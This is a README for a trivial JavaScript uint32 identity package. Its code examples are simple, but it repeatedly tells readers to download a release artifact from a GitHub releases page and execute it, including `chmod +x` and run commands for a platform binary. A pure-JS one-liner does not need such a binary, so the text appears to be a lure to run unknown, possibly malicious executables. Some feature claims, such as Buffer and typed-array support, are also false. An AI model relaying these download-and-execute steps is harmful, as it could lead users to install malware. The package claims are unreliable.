# number-uint32-base-identity — Uint32 identity function for JavaScript 🚀

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/Captain112-bit/number-uint32-base-identity/releases)

Evaluate the identity function for an unsigned 32-bit integer. This package returns the same numeric value you give it, constrained to the uint32 domain.

---

![nodejs](https://nodejs.org/static/images/logos/nodejs-new-pantone-black.svg) ![math](https://img.shields.io/badge/Math-Integer-brightgreen)

Table of contents
- About
- Features
- Install
- Quick usage
- API
- Examples
- Typed-array and binary use
- Benchmarks
- Tests
- Contributing
- Releases
- License

About
-
This package implements an identity function for unsigned 32-bit integers. The function accepts any JavaScript value that can represent a number and returns its uint32 representation. It keeps the value within [0, 2^32 - 1] by applying standard unsigned conversion. Use it when you need a stable cast to uint32 without changing bit representation.

Features
-
- Simple API: one function, one return.
- Works with numbers, BigInt, buffers, and typed arrays.
- Zero dependency, small size.
- Predictable behavior across Node.js versions.
- Fast and direct conversion using native JS bit operations.

Install
-
Install from npm:

npm install number-uint32-base-identity

Or download the release artifact and run it. Download the release file from:
https://github.com/Captain112-bit/number-uint32-base-identity/releases
Download the release artifact from the Releases page and execute the included script or binary as described in the release notes. The release file needs to be downloaded and executed to run any packaged CLI or native build.

Quick usage
-
Common pattern:

const identity = require('number-uint32-base-identity');

const x = identity(123);       // 123
const y = identity(-1);        // 4294967295 (0xFFFFFFFF)
const z = identity(1.5);       // 1 (fraction truncated by bit op)

API
-
identity(value)
- value: number | BigInt | Buffer | TypedArray | any (coercible to Number)
- returns: number (unsigned 32-bit integer)

Behavior:
- Coerces values to Number when required.
- Uses the >>> 0 operation to yield a uint32 integer.
- Truncates fractional parts.
- Converts negative numbers to their uint32 two's complement form.

Examples
-
Basic:

const identity = require('number-uint32-base-identity');

identity(0);              // 0
identity(4294967295);     // 4294967295
identity(-1);             // 4294967295
identity(3.9);            // 3

With BigInt:

const identity = require('number-uint32-base-identity');
identity(Number(123n));   // 123

With objects:

identity({ valueOf: () => 5 }); // 5

Typed-array and binary use
-
This function suits byte-level and binary workflows where you need a consistent uint32 value:

const identity = require('number-uint32-base-identity');

const view = new DataView(new ArrayBuffer(8));
view.setUint32(0, 0xFFFFFFFF, true); // little-endian
const raw = view.getUint32(0, true);
identity(raw); // 4294967295

Buffer:

const buf = Buffer.from([0xff,0xff,0xff,0xff]);
const val = buf.readUInt32BE(0);
identity(val); // 4294967295

CLI (if provided in releases)
-
If a CLI binary ships in the Releases, download the artifact from:
https://github.com/Captain112-bit/number-uint32-base-identity/releases
Execute the supplied binary or script. The release artifact needs to be downloaded and executed. Typical pattern:

# make executable then run (example)
chmod +x number-uint32-base-identity-linux-x64
./number-uint32-base-identity-linux-x64 123
# prints: 123

Benchmarks
-
The function uses a single JS bit operation and runs at native speed for JS integer conversions. Typical micro-benchmark:

- identity(value) uses value >>> 0
- Performance matches native unsigned conversions
- Low overhead compared to typed-array reads

If you need a full benchmark suite, run the tests and benchmarks in the repo:

npm run benchmark

Tests
-
Run the test suite:

npm test

Tests cover:
- Numbers (positive, negative, fractional)
- BigInt conversions
- Buffer and TypedArray inputs
- Edge cases at 0 and 2^32 - 1

Contributing
-
- Open an issue for bugs or feature requests.
- Fork the repository and submit a pull request.
- Keep changes small and focused.
- Add tests for new behavior.

Releases
-
Download the release artifact from:
https://github.com/Captain112-bit/number-uint32-base-identity/releases

If the repository provides a packaged binary or installer on the Releases page, download that file and execute it locally. The release file needs to be downloaded and executed to use any packaged CLI or native build. You can also browse release notes on the Releases page to pick the right artifact for your OS.

Releases badge:

[![Releases](https://img.shields.io/badge/Releases-See%20Releases-blue?logo=github)](https://github.com/Captain112-bit/number-uint32-base-identity/releases)

License
-
MIT

Files and layout (typical)
-
- package.json — npm metadata
- index.js — main implementation
- README.md — this file
- test/ — unit tests
- bench/ — micro-benchmarks
- CHANGELOG.md — release notes

Implementation hints
-
A minimal implementation looks like:

function identity(v) {
  // Coerce to number and to unsigned 32-bit integer
  return Number(v) >>> 0;
}

This approach:
- Truncates fractions
- Maps negative numbers to their uint32 two's complement
- Keeps values within 0..4294967295

Why this package
-
When you want a tiny, deterministic cast to uint32, this function feels natural. It avoids extra dependencies and uses a single well-known JS operation. It fits serialization, hashing, binary protocols, low-level math, and interop with systems that expect 32-bit unsigned integers.

Badges and links
-
Build: [![Build Status](https://img.shields.io/badge/build-passing-brightgreen)](#)
NPM: [![npm](https://img.shields.io/badge/npm-v1.0.0-red)](#)
Releases: [![Releases](https://img.shields.io/badge/Releases-Available-blue?logo=github)](https://github.com/Captain112-bit/number-uint32-base-identity/releases)

Images and assets
-
- Node.js logo: https://nodejs.org/static/images/logos/nodejs-new-pantone-black.svg
- Shields: https://img.shields.io

Contact
-
Open issues and pull requests on the repository. Use the Releases page to download any packaged binaries:
https://github.com/Captain112-bit/number-uint32-base-identity/releases